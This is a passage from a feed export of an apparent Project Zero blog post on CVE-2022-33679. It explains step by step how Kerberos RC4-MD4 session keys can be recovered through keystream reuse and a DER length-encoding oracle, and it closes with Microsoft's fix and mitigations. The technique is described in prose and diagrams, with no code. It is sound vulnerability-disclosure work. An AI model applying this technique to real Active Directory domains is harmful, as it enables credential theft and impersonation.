encrypt the timestamp to send to the KDC. This is used to validate the user authentication and an AS-REP is returned with a TGT session key generated for RC4-MD4." border='0' style='max-height: 750px; max-width: 600px;' /></a>

<span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><br /><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline;">The timestamp itself has the following ASN.1 structure, which is serialized using the </span><a href="https://en.wikipedia.org/wiki/X.690#DER_encoding" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline;">Distinguished Encoding Rules (DER)</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline;"> and then encrypted.</span></span><p></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">PA-ENC-TS-ENC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ::= SEQUENCE {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;patimestamp &nbsp; &nbsp; [0] KerberosTime -- client's time --,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pausec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [1] Microseconds OPTIONAL</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The AS-REP encrypted response has the following ASN.1 structure:</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">EncASRepPart&nbsp; ::= SEQUENCE {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [0] EncryptionKey,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;last-req&nbsp; &nbsp; &nbsp; &nbsp; [1] LastReq,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nonce &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [2] UInt32,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key-expiration&nbsp; [3] KerberosTime OPTIONAL,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flags &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [4] TicketFlags,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;authtime&nbsp; &nbsp; &nbsp; &nbsp; [5] KerberosTime,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;starttime &nbsp; &nbsp; &nbsp; [6] KerberosTime OPTIONAL,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;endtime &nbsp; &nbsp; &nbsp; &nbsp; [7] KerberosTime,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;renew-till&nbsp; &nbsp; &nbsp; [8] KerberosTime OPTIONAL,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;srealm&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [9] Realm,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sname &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [10] PrincipalName,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;caddr &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [11] HostAddresses OPTIONAL</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">We can see from the two structures that as luck would have it the session key in the AS-REP is at the start of the encrypted data. This means there should be an overlap between the known parts of the timestamp and the key, allowing us to apply key stream recovery to decrypt the session key without any brute force needed.</span></p><br />

<a href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg24DDfsRh9c8OtrHaHSYfjKbUOPqVKpbrgf1ifZslYw1JDXAv8Q3hXmZRzz3MSsByAMoAg7Tpj5OIw3VzE5e9mrqIQ_fs-pLE61jHNF47qF1dBr-zFg7OV5hOSuDLJy7b9vYJm6hw5tDmK2-Oznd1hzj1a8NlBNBnGfxdX2lQfkrxQtGkhFy_nz9xR/s1187/image1.png' style='display: block; padding: 1em 0; text-align: center;'><img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg24DDfsRh9c8OtrHaHSYfjKbUOPqVKpbrgf1ifZslYw1JDXAv8Q3hXmZRzz3MSsByAMoAg7Tpj5OIw3VzE5e9mrqIQ_fs-pLE61jHNF47qF1dBr-zFg7OV5hOSuDLJy7b9vYJm6hw5tDmK2-Oznd1hzj1a8NlBNBnGfxdX2lQfkrxQtGkhFy_nz9xR/s600/image1.png' alt="Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between known bytes in the timestamp with the 40 bit session key in the AS-REP." title="Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between known bytes in the timestamp with the 40 bit session key in the AS-REP." border='0' style='max-height: 750px; max-width: 600px;' /></a>

<br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; white-space: pre-wrap;">The diagram shows the ASN.1 DER structures for the timestamp and the start of the AS-REP. The values with specific hex digits in green are plain-text we know or can calculate as they are part of the ASN.1 structure such as types and lengths. We can see that there's a clear overlap between 4 bytes of known data in the timestamp with the first 4 bytes of the session key. We only need the first 5 bytes of the key due to the padding at the end, but this does mean we need to brute force the final key byte.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">We can do this brute force one of two ways. First we can send service ticket requests with the user's TGT and a guess for the session key to the KDC until one succeeds. This would require at most 256 requests to the KDC. Alternatively we can capture a service ticket request from the client which is likely to happen immediately after the authentication. As the service ticket request will be encrypted using the session key we can perform the brute force attack locally without needing to talk to the KDC which will be faster. Regardless of the option chosen this approach would be orders of magnitude faster than brute forcing the entire 40 bit session key.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The simplest approach to performing this exploit would be to interpose the client to server connection and modify traffic. However, as the initial request without pre-authentication just returns an error message it's likely the exploit could be done by injecting a response back to the client while the KDC is processing the real request. This could be done with only the ability to monitor network traffic and inject arbitrary network traffic back into that network. However, I've not verified that approach.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Exploitation without Interception (CVE-2022-33679)</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The requirement to have access to the client to server authentication traffic does make this vulnerability seem less impactful. Although there's plenty of scenarios where an attacker could interpose, such as shared wifi networks, or physical attacks which could be used to compromise the computer account authentication which would take place when a domain joined system was booted.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">It would be interesting if there was an attack vector to exploit this without needing a real Kerberos user at all. I realized that if a user has pre-authentication disabled then we have everything we need to perform the attack. The important point is that if pre-authentication is disabled we can request a TGT for the user, specifying RC4-MD4 encryption and the KDC will send back the AS-REP encrypted using that algorithm.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The key to the exploit is to reverse the previous attack, instead of using the timestamp to decrypt the AS-REP we'll use the AS-REP to encrypt a timestamp. We can then use the timestamp value when sent to the KDC as an encryption oracle to brute force enough bytes of the key stream to decrypt the TGT's session key. For example, if we remove the optional microseconds component of the timestamp we get the following DER encoded values:</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><br /></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"></span></p>

<a href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJwOslmDADrdMxHQePmjJB4AwNGPGaFkdemYZCTgtHzSOcKYXYq46I5ETenRLGSjx-aPpCGMj40oox50HylEiImPmompOLGzAs0mNSRbjQtEUWhlNl6xv3XWladvkt__nep8zR4GEcMTLUHzqpC5ECmGSjYlr7CINK8BP3lBrX8n5u1hTKwcrBzMEd/s1057/image2.png' style='display: block; padding: 1em 0; text-align: center;'><img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJwOslmDADrdMxHQePmjJB4AwNGPGaFkdemYZCTgtHzSOcKYXYq46I5ETenRLGSjx-aPpCGMj40oox50HylEiImPmompOLGzAs0mNSRbjQtEUWhlNl6xv3XWladvkt__nep8zR4GEcMTLUHzqpC5ECmGSjYlr7CINK8BP3lBrX8n5u1hTKwcrBzMEd/s600/image2.png' alt="Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between known bytes in the AS-REP and the timestamp string which can be used to generate a valid encrypted timestamp." title="Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between known bytes in the AS-REP and the timestamp string which can be used to generate a valid encrypted timestamp." border='0' style='max-height: 750px; max-width: 600px;' /></a>

<span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><br /></span><p></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The diagram shows that currently there's no overlap between the timestamp, represented by the T bytes, and the 40 bit session key. However, we know or at least can calculate the entire DER encoded data for the AS-REP to cover the entire timestamp buffer. We can use this to calculate the keystream for the user's RC4-MD4 key without actually knowing the key itself. With the key stream we can encrypt a valid timestamp and send it to the KDC.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">If the KDC responds with a valid AS-REP then we know we've correctly calculated the key stream. How can we use this to start decrypting the session key? The </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">KerberosTime</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> value used for the timestamp is an ASCII string of the form </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">YYYYMMDDHHmmssZ</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. The KDC parses this string to a format suitable for processing by the server. The parser takes the time as a NUL terminated string, so we can add an additional NUL character to the end of the string and it shouldn't affect the parsing. Therefore we can change the timestamp to the following:</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><br /></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"></span></p>

<a href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHkQxlTmqYoIrJDtSjALIbuKT6vXVkaSM2QGjB8aErmNyny_lSLBJt4ZogLrR2naCcnSc15TiR-oq45Xj2-WDfmZpNzs1k0RYZH2VQKpLb6Whj8Z4nNkc5DIK_CdQvfT3ncuVdLnAdMSBhclQIYpIWB26fmbSWaVzdQXwYkbnnz6iPxYCGJ1sNY7rM/s1032/image4.png' style='display: block; padding: 1em 0; text-align: center;'><img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHkQxlTmqYoIrJDtSjALIbuKT6vXVkaSM2QGjB8aErmNyny_lSLBJt4ZogLrR2naCcnSc15TiR-oq45Xj2-WDfmZpNzs1k0RYZH2VQKpLb6Whj8Z4nNkc5DIK_CdQvfT3ncuVdLnAdMSBhclQIYpIWB26fmbSWaVzdQXwYkbnnz6iPxYCGJ1sNY7rM/s1032/image4.png' alt="Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between a final NUL character at the end of the timestamp string which overlaps with the first byte of the 40 bit session key." border='0' style='max-height: 750px; max-width: 600px;' title="Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between a final NUL character at the end of the timestamp string which overlaps with the first byte of the 40 bit session key." /></a>


<span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><br /><br /></span><p></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">We can now guess a value for the encrypted NUL character and send the new timestamp to the KDC. If the KDC returns an error we know that the parsing failed as it didn't decrypt to a NUL character. However, if the authentication succeeds the value we guessed is the next byte in the key stream and we can decrypt the first byte of the session key.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">At this point we've got a problem, we can't just add another NUL character as the parser would stop on the first one we sent. Even if the value didn't decrypt to a NUL it wouldn't be possible to detect. This is when a second trick comes into play, instead of extending the string we can abuse the way value lengths are encoded in DER. A length can be in one of two forms, a short form if the length is less than 128, or a long form for everything else.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">For the short form the length is encoded in a single byte. For the long form, the first byte has the top bit set to 1, and the lower 7 bits encode the number of trailing bytes of the length value in big-endian format. For example in the above diagram the timestamp's total size is 0x14 bytes which is stored in the short form. We can instead encode the length in an arbitrary sized long form, for example </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x81 0x14</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">, </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x82 0x00 0x14</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">, </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x83 0x00 0x00 0x14</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> etc. The examples shown below move the NUL character to brute force the next two bytes of the session key:</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><br /></span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><br /></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"></span></p>

<a href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsKgGYAwo0YMFIjyz2Htl9U6igMxgQULM7SMPuDKr4jsQckfpZSvEUSshnUpNK15rRJD5ZD9mjSOgFn7F2_vgCGr1HHHGXRuGQZmMqHwAV7c7JairJhIUONjxM7YVBkWxBdxC9MfuXPxfISUEzVaPeRG5EsvlL91sgnZs4gXMjApMLYcZq4oXy7ZEg/s1038/image6.png' style='display: block; padding: 1em 0; text-align: center;'><img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsKgGYAwo0YMFIjyz2Htl9U6igMxgQULM7SMPuDKr4jsQckfpZSvEUSshnUpNK15rRJD5ZD9mjSOgFn7F2_vgCGr1HHHGXRuGQZmMqHwAV7c7JairJhIUONjxM7YVBkWxBdxC9MfuXPxfISUEzVaPeRG5EsvlL91sgnZs4gXMjApMLYcZq4oXy7ZEg/s1038/image6.png' alt="Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows extending the first length field so there is an overlap between a final NUL character at the end of the timestamp string which overlaps with the second and third bytes of the 40 bit session key." title="Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows extending the first length field so there is an overlap between a final NUL character at the end of the timestamp string which overlaps with the second and third bytes of the 40 bit session key." border='0' style='max-height: 750px; max-width: 600px;' /></a>

<p></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Even though technically DER should expect the shortest form necessary to encode the length the Microsoft ASN.1 library doesn't enforce that when parsing so we can just repeat this length encoding trick to cover the remaining 4 unknown bytes of the key. As the exploit brute forces one byte at a time the maximum number of requests that we'd need to send to the KDC is 5  2</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span style="font-size: 0.6em; vertical-align: super;">8 </span></span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">which is 1280 requests as opposed to 2</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span style="font-size: 0.6em; vertical-align: super;">40</span></span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> requests which would be around 1 trillion.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Even with such a small number of requests it can still take around 30 seconds to brute force the key, but that still makes it a practical attack. Although it would be very noisy on the network and you'd expect any competent EDR system to notice, it might be too late at that point.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">The Fixes</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The only fix I can find is in the KDC service for the domain controller. Microsoft has added a new flag which by default disables the RC4-MD4 algorithm and an old variant of RC4-HMAC with the encryption type of -133. This behavior can be re-enabled by setting the KDC configuration registry value </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">AllowOldNt4Crypto</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. The reference to NT4 is a good indication on how long this vulnerability has existed as it presumably pre-dates the introduction of Kerberos in Windows 2000. There are probably some changes to the client as well, but I couldn't immediately find them and it's not really worth my time to reverse engineer it.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">It'd be good to mitigate the risk of similar attacks before they're found. Disabling RC4 is definitely recommended, however that can bring </span><a href="https://syfuhs.net/lessons-in-disabling-rc4-in-active-directory" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">its own problems</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. If this particular vulnerability was being exploited in the wild it should be pretty easy to detect. Also unusual Kerberos encryption types would be an immediate red-flag as well as the repeated login attempts.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Another option is to enforce </span><a href="https://syfuhs.net/kerberos-fast-armoring" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">Kerberos Armoring (FAST)</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> on all clients and KDCs in the environment. This would make it more difficult to inspect and tamper with Kerberos authentication traffic. However it's not a panacea, for example for FAST to work the domain joined computer needs to first authenticate without FAST to get a key they can then use for protecting the communications. If that initial authentication is compromised the entire protection fails.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><br /></span></p></span>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/8303427457754488503/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/8303427457754488503
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/8303427457754488503
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html
## @title
RC4 Is Still Considered Harmful
## author
## name
Unknown
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRE6Kj-svyxGDL8OhnPM46jhk7cf3JEJrssrRSwToM3q63wAaqtboIVHeEiZ5bONQoHZNapfdxpDr3kXMbxLakja1tqshef6N4GDNlw1BXyhanRY_Jg2zDqTlIPmHZBZ2XvCMf_23GXoRSS-18_zLCfwYV2v4xOR5usrM4zq1AONy2U57oCk-n-BpW/s72-c/image5.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-6481767562526230244
## published
10/08/2022 20:00:00
## updated
24/08/2022 15:55:31
## title
## @type
text
## #text
The quantum state of Linux kernel garbage collection CVE-2021-0920 (Part I)
## content
## @type
html
## #text
